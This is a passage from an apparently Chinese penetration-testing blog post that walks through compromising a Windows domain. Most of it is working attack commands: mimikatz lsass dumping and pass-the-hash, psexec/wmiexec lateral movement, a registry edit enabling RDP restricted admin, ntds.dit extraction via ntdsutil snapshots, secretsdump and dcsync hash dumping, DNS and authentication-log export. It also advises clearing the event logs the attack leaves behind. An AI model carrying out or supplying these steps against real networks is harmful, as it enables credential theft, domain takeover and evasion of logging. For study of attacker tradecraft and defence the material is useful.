​ 3). 下载lsass.dmp；
​ 4). 在本地运行mimikatz
        mimikatz # sekurlsa::minidump lsass.dmp
    mimikatz # sekurlsa::logonPasswords full
即可看到所有本地保存的hash
幸运的是，我们确实拿到了域管的hash，并且还是明文的，虽然不是明文也无所谓（后面才知道）
### 二、横向扩展执行命令常用方法
当我们拿到域管密码的时候，如果不想进行远程登录但想在目标机器上执行命令，可以采用以下几种方法：
  1. psexec  
psexec是微软官方的PsTools里的一款工具，利用445或者139端口，开启一个交互式的命令控制台。  
psexec主要通过admin$和ipc$共享，将psexesvc.exe文件上传，然后通过用于启动服务二进制文件的服务控制管理器（sc），在目标主机上创建命名管道，并将该管道用于输入和输出操作，就可以获得一个交互式的命令控制台。原理图如下：
​
详细分析可参考[这篇文章](https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/)。
​ **用法：**
        # -s 为Run the remote process in the System account
    PsExec.exe \\xxx.xxx.xxx.xxx -u domain.com\user_name -p password -s cmd
​ 同时要考虑psexec会在对方机器留下的痕迹：  
a. PSEXESVC 服务将会安装在远程系统中，如果是断网退出，psexec服务和psexec.exe不会被删除；  
b. 生成 Event 4697、7045、4672 这3种事件日志，主要是内容是psexec服务启动和凭据认证。
  2. wmic  
WMIC是一款命令行工具，不但可以管理本地计算机，还可以管理远程计算机。缺点是不会进行回显，所以可以结合写文件和smb读文件进行命令执行。
**用法：**
        wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create "cmd.exe /c ipconfig>d:\result.txt"
wmic在平常渗透中用的比较少，但是在某些特定场景可以使用，比如需要特定用户的权限去执行命令。
  3. wmiexec  
wmiexec.py是[impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)里的一个组件，类似于smbexec的方法，但是通过WMI执行命令，所以它补足了wmic不能回显的缺点。  
**用法** ：
        python3 wmiexec.py test.com/PI:EMAIL -hashes xxxx:xxx(LMHASH:NTHASH)
看到这里菜菜鸡不禁思考了起来，wmiexec与psexec区别到底是啥呢？在实践环境中该用哪个呢？
我们可以重新梳理下它们的流程以及要利用到的端口：  
**psexec** ：
        1. 提供凭据，SMB验证
    2. 使用IPC$和admin$共享上传psexec.exe
    3. 通过远程调用创建服务并启动
    4. 用命令管道进行输入输出处理
    5. 结束后删除psexec.exe和服务
    依赖于445端口，可取得system权限
**wmiexec** ：
        1. 提供凭据，SMB验证
    2. 提供凭据，建立DCOM连接
    3. 输入命令
    4. 对命令进行拼接处理（将命令结果输出到ADMIN$），并利用建立好的DCOM连接和__win32Process执行命令
    5. 取回结果并显示，然后删除结果文件(OUTPUT_FILENAME = '__' + str(time.time()))
    依赖于135、445端口，不需要system权限，但必须要是admin权限
综上，wmiexec与psexec相比：  
**优点** ：
a. 无exe落地；
b. 不会在对方的机器上启动服务，只会留下认证日志。
**缺点** ：
a. 需要135端口；
b. 会有输出结果文件落地；
c. 经过流量抓包，发现命令是明文传输的。
所以如果在流量审查比较严格和135端口不通的环境中，菜菜鸡会考虑用psexec，如果在日志审查严格的环境中，菜菜鸡会考虑使用wmiexec。
除此之外，还要考虑杀软、防火墙和域策略，菜菜鸡还没测过在杀软环境下psexec和wmiexec的表现，所以任重而道远。
  4. pth  
pth(pass the hash)是一种利用NTLM哈希来向远程服务器或服务进行身份验证，从而绕过使用明文密码限制的技术。根据wikipedia的介绍：
        在使用NTLM身份验证的系统或服务上，用户密码永远不会以明文形式通过网络发送。相反，它们像域控制器一样作为哈希提供给请求系统，作为对质询-响应身份验证方案的响应。
    本机Windows应用程序向用户询问明文密码，然后调用LsaLogonUser之类的API，将该密码转换为一个或两个哈希值（LM或NT哈希），然后在NTLM身份验证期间将其发送到远程服务器。对这种机制的分析表明，成功完成网络身份验证不需要明文密码，只需要哈希即可。
    如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们获取的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。
可以大致看出pth是利用NTLM认证机制的特性进行哈希传递，这会使在渗透场景中，使用NTLM认证的任何服务或服务器，例如SMB、WEB应用等，变得十分脆弱。
废话不多说，直接举几个栗子：
下面都是使用mimikatz来进行pth攻击的例子
a. psexec
    privilege::debug
       sekurlsa::pth /user:user /domain:test /ntlm:xxxxxxxx
       PsExec.exe /accepteula \\192.168.1.1 cmd.exe
b. wmiexec
wmiexec就是用的hash
    python3 wmiexec.py test.com/PI:EMAIL -hashes xxxx:xxx(LMHASH:NTHASH)
c. rdp
    privilege::debug
       sekurlsa::pth /user: /domain: /ntlm: /run:"mstsc.exe /restrictedadmin"
然后输入地址直接连接就可以了。
这个默认是不开的，需要开启策略：
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
如果有特定用户RDP需求可以通过psexec上去开启策略然后RDP上去。
d. web application
如果使用了NTLM认证的网站，例如在IIS配置了NTLM认证，也可以使用pth攻击，具体可以查看[这篇文章](https://labs.f-secure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/)。
    privilege::debug
       sekurlsa::pth /user:pth /ntlm:57f5f9f45e6783753407ae3a8b13b032 /domain:TEST /run:cmd.exe
在弹出的命令行执行
    "C:\Program Files\internet explorer\iexplore.exe"
在IE-Internet选项-安全-本地Internet-站点-高级，添加目标站点到区域，
然后访问目标网站即可完成NTLM认证。
到现在为止，菜菜鸡已经有了意大利炮，可以向域控发起攻击了。
### 三、中期信息收集
现在菜菜鸡已经登陆上域控了，那么菜菜鸡下一步该做什么呢？这里不禁要思考，域控有什么？通常来说，域控通常会有：
    1. 域所有用户的hash和域组织结构
    2. DNS
    3. 可能保存其它域管的明文密码
    4. 域认证日志
我们首要目标是 **域所有用户的hash和域组织结构** ，其次再是DNS和域认证日志
  1. ntds.dit导出  
Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。
但通常我们没办法直接复制它，直接复制会提示"文件正在使用"，所以我们可以通过Shadow Copy来复制它。
参考[这篇文章](https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%8F%96NTDS.dit.html)，可以知道系统自带两个命令：ntdsutil和vssadmin，通过这两个命令可以将ntds.dit导出，不过会产生Event
ID为7036和98的日志，注意清除，下面以ntdsutil为例：
a. 创建快照：
        ntdsutil snapshot "activate instance ntds" create quit quit
该命令会返回快照的guid。
b. 挂载快照
        ntdsutil snapshot "mount {88663f87-3791-4ee4-8fe6-d5172fc85748}" quit quit
该命令会返回挂载到的位置。
c. 复制ntds.dit
        copy C:\$SNAP_202101181507_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
d. 卸载快照
        ntdsutil snapshot  "unmount {88663f87-3791-4ee4-8fe6-d5172fc85748}" quit quit
e. 删除快照
        ntdsutil snapshot  "delete {88663f87-3791-4ee4-8fe6-d5172fc85748}" quit quit
f. 查看是否完成卸载和删除
        ntdsutil snapshot "List All" quit quit
    ntdsutil snapshot "List Mounted" quit quit
然后再运行：
        reg save HKLM\SYSTEM sys.hiv
将sys.hiv拖回来，配合ntds.dit就可以将数据库给解出。
除此之外，还有很多种利用Shadow Copy的方法，但原理都大同小异。
  2. 域hash导出  
域hash导出的方法有很多种， 下面举三个例子：
a. ntds.dit  
在上文中，我们已经获取到了ntds.dit和HKLM\SYSTEM注册表，利用Impacket的secretsdump.py就可以解出：
        python secretsdump.py -ntds ntds.dit -system registry/SYSTEM LOCAL --outputfile hash.txt
b. mimikatz
利用mimikatz也可以导出域的hash，并且不一定要在域控上，但权限要够：
        mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
c. secretsdump.py
secretsdump.py是Impacket里的一个脚本，跟wmiexec一样可以用hash认证：
        python secretsdump.py test.com/administrator@10.x.x.x -just-dc -hashes xxxxx:xxxxx
  3. DNS记录导出  
在域环境中，域控通常也承担DNS的职能，所以我们可以直接从域控上导出该域控管理的DNS记录。
        # 枚举出所有区域，本域或域林中其它区域管理的区域
    Dnscmd DC.test.com /EnumZones
    # 更详细的列出某个域名的DNS记录，该域名得是该域管理下的
    Dnscmd . /ZonePrint test.com
    # 简洁的列出某个域名的DNS记录
    Dnscmd . /EnumRecords test.com .
下面给出一个网上找的powershell导出Dns的脚本，这个导出的DNS记录也比较详细：
        # powershell 导dns
    $Zones = @(Get-DnsServerZone)
    ForEach ($Zone in $Zones) {
    Write-Host "`n$($Zone.ZoneName)" -ForegroundColor "Green"
    $Zone | Get-DnsServerResourceRecord |fl
    }
如果是不在域控的情况下，也可以利用dnscmd远程导dns记录，不过要借助mimikatz的pth功能。
  4. 域认证记录导出  
利用命令：
        wevtutil qe security /q:"Event[System[(EventID=4624 or EventID=4768 or EventID=4776)]]" /f:text /rd:true > C:\Windows\temp\Evtlogon.txt
将经过该域控认证的认证日志导出，其中包含了一些用户名和被登陆机器的IP。
### 四、后期信息收集
​
在经过中期信息收集之后，后期的扩展目标就不是单纯的某台机器，而是人与文档，可以尝试着根据在域控收集到的组织结构和域认证记录找到某个部门的IP段从而进行定向攻击，提升效率。总而言之还是需要大量的信息收集才能达到目的，最终菜菜鸡也通过翻文档和翻机器找到想要的东西，完成了域的渗透。
### 五、总结
​
在真实环境中，域的复杂程度取决于域的大小、运维人员的专业程度，有时候运维人员不专业，网段不隔离，没有防火墙，没有流量审计，会让整个渗透变得十分简单，但是如果做得十分专业，网段隔离，有防火墙，有流量审计等，会让整个渗透变得十分困难，这个时候就十分考验菜菜鸡的对抗能力了，但是借助好的方法和工具往往能如虎添翼，让敌人措手不及。